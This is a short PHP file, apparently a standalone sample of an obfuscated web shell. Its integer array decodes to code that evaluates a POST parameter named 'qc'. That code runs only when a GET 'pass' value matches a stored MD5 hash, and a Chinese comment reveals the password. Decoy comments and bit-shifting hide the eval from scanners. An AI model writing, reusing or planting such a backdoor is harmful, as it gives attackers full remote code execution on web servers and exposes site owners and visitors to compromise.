<?php

class abc {
    //密码：qc
    public $aaa = [25856,12288,30208,12288,24832,12288,27648,10240,9216,24320,20480,20224,12544,21248,21504,23296,9984,28928,12800,13056,25344,9984,23808,10496,15104];
    function __construct() {
        if (md5($_GET["pass"]) === "1a1dc91c907325c69271ddf0c944bc72"){
            @eval("/*ls32QING*/".def($this->aaa)."/*slk45CHENgjl*/");
        }
    }
}
function def($arr){
    $str = "";
    foreach ($arr as $v){
        $str .= chr($v >> 8);
    }
    for($i=0;$i<strlen($str);$i++){
        $arr[$i] = $str[$i]^"*";
    }
    $str2 = "";
    for($i=0;$i<strlen($str);$i++){
        if(!((ord($str[$i])>=48) and (ord($str[$i])<=57))){
            $str2 .= $str[$i];
        }
    }
    return $str2;
}
new abc();

?>